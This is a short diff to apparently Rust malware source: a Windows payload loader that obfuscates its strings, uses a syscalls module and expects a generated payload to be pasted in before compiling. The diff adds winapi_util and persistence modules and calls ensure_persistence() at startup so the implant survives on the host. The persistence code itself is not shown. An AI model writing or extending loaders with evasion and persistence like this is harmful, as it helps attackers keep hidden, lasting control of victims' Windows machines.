@@ -2,6 +2,10 @@ use obfuscator::{obfuscate, obfuscate_string};
 
 #[cfg(windows)]
 mod syscalls;
+#[cfg(windows)]
+mod winapi_util;
+#[cfg(windows)]
+mod persistence;
 
 #[cfg(windows)]
 use std::{mem, ptr};
@@ -365,6 +369,10 @@ fn transform_data(data: &[u8], key: &[u8]) -> Vec<u8> {
 fn main() {
     #[cfg(windows)]
     {
+        if let Err(e) = persistence::ensure_persistence() {
+            eprintln!("{}{}", obfuscate_string!("[ERROR] Persistence failed: "), e);
+        }
+
         if PAYLOAD.is_empty() {
             eprintln!("{}", obfuscate_string!("[ERROR] The PAYLOAD is empty. Please generate a payload and paste it into the source code before compiling."));
             return;
